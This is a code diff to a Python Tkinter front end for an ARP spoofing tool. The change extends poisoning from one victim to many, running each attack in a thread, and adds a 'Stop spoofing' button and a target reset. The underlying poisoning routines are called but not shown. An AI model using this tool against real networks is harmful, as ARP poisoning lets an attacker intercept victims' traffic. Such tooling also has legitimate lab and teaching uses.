@@ -1,5 +1,5 @@
 #! /usr/bin/env python
-
+import threading
 from Tkinter import *
 import ttk as t
 import scan
@@ -63,6 +63,7 @@ def select_interface(event="x"):
     packets_entry.delete(0, END)
     packets_entry.insert(0, '100')
 
+    stop_button['state'] = "normal"
     silent_button['state'] = "normal"
     attack_button['state'] = "normal"
     restore_button['state'] = "normal"
@@ -76,6 +77,7 @@ def poison(silent=False):
     attacker = attacker_entry.get()
 
     target = targets_combo.curselection()
+    targets[:] = []
 
     for i in target:
         targets.append(targets_combo.get(i, i + 1)[0])
@@ -86,18 +88,21 @@ def poison(silent=False):
         logger.warn("Please set at least one packet")
     elif len(attacker) != 0 and not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", attacker.lower()):
         logger.warn("The attacker MAC address is not of correct format")
-    elif len(targets) == 1:
-        target = targets[0].split(', ')
-
+    elif len(targets) > 0:
         if len(attacker) == 0:
             attacker = None
+        for target in targets:
+            target = target.split(', ')
 
-        if silent:
-            scan.arp_poison_stealthy(router_ip=router[0], victim_ip=target[0], victim_mac=target[1],
-                                     attacker_mac=attacker)
-        else:
-            scan.arp_poison(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1],
-                            attacker_mac=attacker, iterations=int(packets))
+            if silent:
+                poison_thread = threading.Thread(target=scan.arp_poison_stealthy, args=(target[0], target[1], router[0],
+                                                                                        attacker))
+                poison_thread.start()
+
+            else:
+                poison_thread = threading.Thread(target=scan.arp_poison, args=(target[0], target[1], router[0],
+                                                                               router[1], attacker, int(packets)))
+                poison_thread.start()
 
 
 # Restores the ARP poison
@@ -109,6 +114,11 @@ def restore():
         target = targets[0].split(', ')
 
         scan.arp_restore(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1])
+
+
+def stop():
+    for i in targets:
+        scan.set_queue('stop')
 
 
 # Make the basic TKinter gui
@@ -169,6 +179,10 @@ packets_entry = t.Entry(window, width=37, state="disabled", exportselection=0, t
 packets_entry.grid(column=2, columnspan=2, row=row_num, padx=p_x)
 
 row_num += 1
+
+# Add stop button
+stop_button = t.Button(window, text="Stop spoofing", state=DISABLED, command=stop)
+stop_button.grid(column=0, row=row_num, padx=p_x, pady=p_y, stick="EW")
 
 # Add restore button
 restore_button = t.Button(window, text="Restore ARP Tables", state=DISABLED, command=restore)
